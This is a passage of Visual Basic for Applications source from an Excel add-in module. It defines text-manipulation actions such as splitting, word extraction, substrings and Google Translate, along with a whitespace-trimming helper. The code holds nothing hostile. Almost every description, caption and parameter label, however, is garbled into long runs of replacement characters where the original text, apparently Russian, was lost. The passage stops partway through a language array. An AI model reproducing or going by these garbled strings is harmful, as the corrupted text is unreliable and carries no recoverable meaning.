                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {1}, {2}, {8}, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "(|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & _
                       "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|)"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Output", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With

    With AAs.AddAction(fc_Text, "SetDefaultValue", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

End Sub

Function RealTrim(txt, Optional ReplaceLineFeedsWith$ = "", Optional ReplaceTabsWith$ = " ") As String
    On Error Resume Next
    txt = Replace(txt, Chr(160), " ")
    If Len(ReplaceLineFeedsWith$) Then txt = Replace(txt, vbNewLine, ReplaceLineFeedsWith$): txt = Replace(txt, vbLf, ReplaceLineFeedsWith$)
    If Len(ReplaceTabsWith$) Then txt = Replace(txt, vbTab, ReplaceTabsWith$)
    txt = Trim(Application.Trim(txt))
    txt = Replace(txt, " " & vbNewLine, vbNewLine): txt = Replace(txt, vbNewLine & " ", vbNewLine)
    RealTrim = txt
End Function
Attribute VB_Name = "mod_AAs_UNUSED"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_UNUSED                    Version:
' Author        : Igor Vakhnenko                   Date: 14.03.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_UNUSED(ByRef AAs As ArrayActions)
    On Error Resume Next
    Dim COUNT_ARRAY
    COUNT_ARRAY = Array("1", "2", "3", "4", "5")

    With AAs.AddAction(fc_UNUSED, "Split", "# |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (split)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 0, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|1\|fffd||fffd||fffd||fffd||fffd|2\|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|3|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|\|fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| 3" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|): last (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), last-1 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), last-3 (4-|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|); " & vbNewLine & _
                       "ifexist (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Delimiter", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", _
                      Array("0", "1", "2", "3", "4", "5", "last", "last-1", "last-2", "last-3", "1 ifexist", "2 ifexist", "last ifexist"), "0"
    End With

    With AAs.AddAction(fc_UNUSED, "FirstWordOnly", "# |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With

    With AAs.AddAction(fc_UNUSED, "FirstWords", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With

    With AAs.AddAction(fc_UNUSED, "LastWords", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With

    With AAs.AddAction(fc_UNUSED, "TextFrom_Nth_Word", "# |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| N-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| N-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd| N - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| 1), - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "FirstWordIndex", aps_Combo, "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With

    With AAs.AddAction(fc_UNUSED, "CropLastWords", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With

    With AAs.AddAction(fc_UNUSED, "EnglishWords", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."
        .AddParameter "Min", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        .AddParameter "Max", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_UNUSED, "RussianWords", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."
        .AddParameter "Min", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        .AddParameter "Max", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
    End With


    With AAs.AddAction(fc_UNUSED, "Substring", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1000 " & vbNewLine & _
                       "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel =|fffd||fffd||fffd||fffd||fffd||fffd||fffd|()"

        .AddParameter "Start", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
        .AddParameter "Length", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1000"
    End With

    With AAs.AddAction(fc_UNUSED, "RightChars", "# |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel =|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|()"
        .AddParameter "Length", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With

    With AAs.AddAction(fc_UNUSED, "GoogleTranslate", "# |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: GoogleTranslate")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Google Translate" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

        Dim LangArray As Variant
        LangArray = Array("ru", "ar", "da", "en", "fr", "it", "bg", "de", "es", "hi", "ja", "no", "ro", _
